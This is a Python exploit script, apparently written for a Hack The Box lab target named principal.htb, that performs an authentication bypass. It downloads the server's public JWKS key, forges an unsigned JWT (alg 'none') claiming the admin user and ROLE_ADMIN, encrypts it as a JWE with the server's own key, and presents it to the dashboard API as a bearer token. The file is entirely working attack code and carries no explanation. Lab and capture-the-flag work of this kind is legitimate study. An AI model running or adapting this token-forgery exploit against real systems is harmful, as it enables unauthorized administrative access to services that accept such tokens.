import json
import time
import requests
from jwcrypto import jwk, jwe
import base64

TARGET = "http://principal.htb:8080"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def fetch_pubkey():
    r = requests.get(f"{TARGET}/api/auth/jwks", timeout=10)
    r.raise_for_status()
    key_data = r.json()["keys"][0]
    return jwk.JWK(**key_data), key_data["kid"]

def forge_plain_jwt(sub="admin", role="ROLE_ADMIN"):
    now = int(time.time())
    header = b64url(json.dumps({"alg": "none"}).encode())
    payload = b64url(json.dumps({
        "sub": sub,
        "role": role,
        "iss": "principal-platform",
        "iat": now,
        "exp": now + 3600
    }).encode())
    return f"{header}.{payload}."

def wrap_jwe(plain_jwt, pub_key, kid):
    token = jwe.JWE(
        plain_jwt.encode(),
        recipient=pub_key,
        protected=json.dumps({
            "alg": "RSA-OAEP-256",
            "enc": "A128GCM",
            "kid": kid,
            "cty": "JWT"
        })
    )
    return token.serialize(compact=True)

def main():
    pub_key, kid = fetch_pubkey()
    plain = forge_plain_jwt()
    forged = wrap_jwe(plain, pub_key, kid)

    print("[+] Forged token:")
    print(forged)
    print()

    r = requests.get(
        f"{TARGET}/api/dashboard",
        headers={"Authorization": f"Bearer {forged}"},
        timeout=10
    )
    print(f"[+] Status: {r.status_code}")
    print(r.text)

if __name__ == "__main__":
    main()
